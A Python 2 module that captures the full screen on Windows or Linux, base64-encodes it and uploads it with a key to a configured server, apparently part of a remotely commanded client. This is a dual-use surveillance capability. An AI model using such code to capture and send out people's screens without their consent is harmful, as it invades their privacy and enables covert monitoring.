import re
from time import sleep
import requests
import base64
import constants as cfg
from StringIO import StringIO

#from method import get_key_info
import method


class Screenshot():
    def __init__(self):
        print('Screenshot requested.')

    def snap(self):
        if cfg.G_OSNAME.lower() == "windows":
            data = self._snap_windows()
        else:
            data = self._snap_linux()

        if not data:
            raise Exception('Screenshot failed')

        encoded = self.encodeb64(data)

        if not encoded:
            raise Exception('Screenshot failed: could not encode')

        self.upload(encoded)

    def _snap_linux(self):
        from gtk import gdk

        window = gdk.get_default_root_window()
        size = window.get_size()

        print("The size of the window is %d x %d" % size)

        pb = gdk.Pixbuf(gdk.COLORSPACE_RGB, False, 8, size[0], size[1])
        pb = pb.get_from_drawable(window, window.get_colormap(), 0, 0, 0, 0, size[0], size[1])

        if not pb:
            raise Exception("Unable to get the screenshot.")

        buffer = StringIO()

        pb.save('screenshot.png', "png")
        buffer.write(open('screenshot.png', 'rb').read())

        print("Screenshot saved")

        buffer.seek(0)
        return buffer

    def _snap_windows(self):
        import wx

        wx.App()  # Need to create an App instance before doing anything
        screen = wx.ScreenDC()
        size = screen.GetSize()
        bmp = wx.Bitmap(size[0], size[1])
        mem = wx.MemoryDC(bmp)
        mem.Blit(0, 0, size[0], size[1], screen, 0, 0)
        mem.SelectObject(wx.NullBitmap)

        buffer = StringIO()

        bmp.SaveFile(buffer, wx.BITMAP_TYPE_JPEG)
        print("Screenshot saved")

        buffer.seek(0)
        return buffer

    def encodeb64(self, buffer):
        encoded = base64.b64encode(buffer.read())
        encoded = ("data:image/png;base64,{0}").format(encoded)

        return encoded

    def upload(self, b64encoded):
        key = method.get_key_info()

        if not isinstance(b64encoded, (str, unicode)):
            raise Exception('We can only send b64 strings!')

        userdata = {'M': key, 'base64_str': b64encoded}

        print('sending')

        try:
            resp = requests.post('%s%s' % (cfg.P_BASE, cfg.P_UPLOAD), data=userdata)

            if not resp.status_code == 200:
                raise Exception('status code not 200')
        except Exception as ex:
            print 'upload failed: %s' % str(ex)

        print('sent')
